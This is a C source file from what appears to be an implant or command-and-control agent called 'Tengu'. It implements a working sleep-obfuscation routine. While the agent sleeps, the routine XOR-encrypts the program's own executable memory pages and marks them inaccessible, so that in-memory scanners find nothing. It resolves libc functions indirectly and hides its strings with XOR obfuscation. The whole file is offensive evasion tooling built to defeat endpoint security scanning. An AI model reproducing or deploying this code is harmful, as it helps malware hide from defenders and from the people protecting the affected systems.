// sleep_obf.c - Tengu sleep-time code encryption
// XOR-encrypts the agent's own code segment during sleep to evade in-memory
// scanning. Inspired by eclipse/pendulum (Ekko Linux port).
//
// Technique overview:
//   1. Spawn a helper thread that holds pre-resolved libc pointers.
//   2. Encrypt all r-x pages of our own binary (skip this file's pages).
//   3. Make the pages PROT_NONE so scanners see nothing.
//   4. Block on a semaphore (indirect call - no PLT needed).
//   5. Thread wakes after sleep duration, decrypts, signals the semaphore.
//   6. Main thread resumes with fully restored code.
//
// The functions in this file MUST remain unencrypted. They are detected at
// runtime via their page range (obf_start .. obf_end) and excluded from
// encryption. GCC lays out functions within a TU in source order at -Os,
// so placing obf_start first and obf_end last is sufficient.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <time.h>
#include <dlfcn.h>
#include <semaphore.h>
#include <pthread.h>
#include <sys/mman.h>

#include "tengu.h"
#include "obfstr.h"

#define MAX_SEGS  64
#define PG        4096ul
#define PG_DN(x)  ((uintptr_t)(x) & ~(PG - 1))
#define PG_UP(x)  (((uintptr_t)(x) + PG - 1) & ~(PG - 1))

typedef struct { void* addr; size_t len; } Seg;

typedef struct {
    unsigned int  secs;
    uint8_t       key[32];
    Seg           segs[MAX_SEGS];
    int           nsegs;
    sem_t         done;
    int (*fn_nanosleep)(const struct timespec*, struct timespec*);
    int (*fn_mprotect)(void*, size_t, int);
    int (*fn_sem_post)(sem_t*);
    int (*fn_sem_wait)(sem_t*);
} SleepCtx;

// Lower page-range boundary of obf code - must be first function in file.
__attribute__((used)) static void obf_start(void) {}

// Thread: sleeps, XOR-decrypts each segment, restores permissions, signals.
// Calls go through ctx->fn_* (pre-resolved libc addresses, not PLT).
static void* sleep_thread(void* arg) {
    SleepCtx* c = arg;
    struct timespec ts = { .tv_sec = (time_t)c->secs, .tv_nsec = 0 };
    c->fn_nanosleep(&ts, NULL);
    for (int i = 0; i < c->nsegs; i++) {
        uint8_t* p = (uint8_t*)c->segs[i].addr;
        size_t   n = c->segs[i].len;
        c->fn_mprotect(p, n, PROT_READ | PROT_WRITE);
        for (size_t j = 0; j < n; j++) p[j] ^= c->key[j & 31];
        c->fn_mprotect(p, n, PROT_READ | PROT_EXEC);
    }
    c->fn_sem_post(&c->done);
    return NULL;
}

// Parse /proc/self/maps and collect r-x code segments belonging to `self`.
// Splits segments around [skip_lo, skip_hi) to leave the obf pages intact.
static int collect_segs(Seg out[], int max, uintptr_t skip_lo, uintptr_t skip_hi,
                         const char* self) {
    FILE* f = fopen(SXOR(SXOR_PROC_MAPS), "r");
    if (!f) return 0;
    int   n = 0;
    char  line[512], name[256];
    while (fgets(line, sizeof(line), f) && n < max) {
        uintptr_t s, e;
        char prot[8];
        name[0] = '\0';
        if (sscanf(line, "%lx-%lx %7s %*x %*s %*u %255s", &s, &e, prot, name) < 3)
            continue;
        if (prot[0] != 'r' || prot[2] != 'x') continue;
        if (strcmp(name, self) != 0)           continue;

        // Left chunk: [s .. skip_lo)
        if (s < skip_lo && n < max) {
            uintptr_t end = skip_lo < e ? skip_lo : e;
            if (end > s) { out[n].addr = (void*)s; out[n].len = end - s; n++; }
        }
        // Right chunk: [skip_hi .. e)
        if (e > skip_hi && n < max) {
            uintptr_t beg = skip_hi > s ? skip_hi : s;
            if (e > beg) { out[n].addr = (void*)beg; out[n].len = e - beg; n++; }
        }
    }
    fclose(f);
    return n;
}

// Upper page-range boundary of obf code - must be last function in file.
__attribute__((used)) static void obf_end(void) {}

// Drop-in replacement for sleep() with code encryption during the interval.
// Falls back to plain sleep() on any setup failure.
void sleep_obf(unsigned int secs) {
    if (!secs) return;

    uintptr_t skip_lo = PG_DN((uintptr_t)obf_start);
    uintptr_t skip_hi = PG_UP((uintptr_t)obf_end);

    char self[512];
    ssize_t sl = readlink(SXOR(SXOR_PROC_EXE), self, sizeof(self) - 1);
    if (sl <= 0) { sleep(secs); return; }
    self[sl] = '\0';

    SleepCtx* c = calloc(1, sizeof(*c));
    if (!c) { sleep(secs); return; }

    c->secs         = secs;
    c->fn_nanosleep = dlsym(RTLD_DEFAULT, SXOR(SXOR_NANOSLEEP));
    c->fn_mprotect  = dlsym(RTLD_DEFAULT, SXOR(SXOR_MPROTECT));
    c->fn_sem_post  = dlsym(RTLD_DEFAULT, SXOR(SXOR_SEM_POST));
    c->fn_sem_wait  = dlsym(RTLD_DEFAULT, SXOR(SXOR_SEM_WAIT));

    if (!c->fn_nanosleep || !c->fn_mprotect ||
        !c->fn_sem_post  || !c->fn_sem_wait)
        goto fail;

    tengu_getrandom(c->key, 32);
    c->nsegs = collect_segs(c->segs, MAX_SEGS, skip_lo, skip_hi, self);
    if (!c->nsegs) goto fail;

    sem_init(&c->done, 0, 0);

    pthread_t tid;
    if (pthread_create(&tid, NULL, sleep_thread, c) != 0) {
        sem_destroy(&c->done);
        goto fail;
    }
    pthread_detach(tid);

    // Encrypt. Use pre-resolved fn_mprotect so it still works once the PLT
    // page is locked (PROT_NONE) mid-loop.
    for (int i = 0; i < c->nsegs; i++) {
        uint8_t* p = (uint8_t*)c->segs[i].addr;
        size_t   n = c->segs[i].len;
        c->fn_mprotect(p, n, PROT_READ | PROT_WRITE);
        for (size_t j = 0; j < n; j++) p[j] ^= c->key[j & 31];
        c->fn_mprotect(p, n, PROT_NONE);
    }

    // Indirect sem_wait - no PLT involved while segments are locked.
    c->fn_sem_wait(&c->done);

    // Segments fully decrypted; PLT is usable again.
    sem_destroy(&c->done);
    free(c);
    return;

fail:
    free(c);
    sleep(secs);
}
